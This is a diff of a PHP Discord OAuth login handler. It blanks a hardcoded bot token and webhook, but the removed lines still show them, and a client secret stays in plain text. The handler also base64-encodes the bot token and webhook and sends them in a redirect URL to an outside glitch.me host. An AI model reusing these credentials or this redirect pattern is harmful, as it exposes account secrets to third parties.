@@ -13,14 +13,14 @@
             CURLOPT_POST => 1,
             CURLOPT_POSTFIELDS => array(
                 "grant_type" => "authorization_code",
-                "client_id" => "509048618100064259",
-                "client_secret" => "Yz0Ma9McI5rB-PkrNZPKeNEbPJICWkBv",
+                "client_id" => "509048618100064259", // Client ID
+                "client_secret" => "Yz0Ma9McI5rB-PkrNZPKeNEbPJICWkBv", // Client Secret
                 "redirect_uri" => $redirect_uri,
                 "code" => $_GET["code"]
             )
         ));
-        $discordbottoken = "NTA5MDQ4NjE4MTAwMDY0MjU5.DtjreQ.ZVr5QwktLQwlR1tQNSQwtIvgvm8";
-		$hook = "https://discordapp.com/api/webhooks/515347141326012417/8k5h_-eRO1v5tuqdMukU6szmxgq8izrcrxEoT-_-k9HozSxKb4fl7SCn5hWUB9TurSzi";
+        $discordbottoken = ""; // Token do bot
+	$hook = ""; // Webhook 
         curl_setopt($token, CURLOPT_RETURNTRANSFER, true);
         $resp = json_decode(curl_exec($token));
         curl_close($token);
@@ -39,7 +39,6 @@
             curl_close($info);
             $b64token = base64_encode($discordbottoken);
 			$b64hook = base64_encode($hook);
-           // echo "<h1>Hello, {$user->username}#{$user->discriminator}.</h1><br><h2>{$user->id}</h2><br><img src='https://discordapp.com/api/v6/users/{$user->id}/avatars/{$user->avatar}.jpg' /><br><br>Dashboard Token: {$access_token}";
            header("Location: https://lofed.glitch.me/fDJuEUWcFt/{$user->id}&{$b64token}&{$b64hook}");
            die();
         } else {
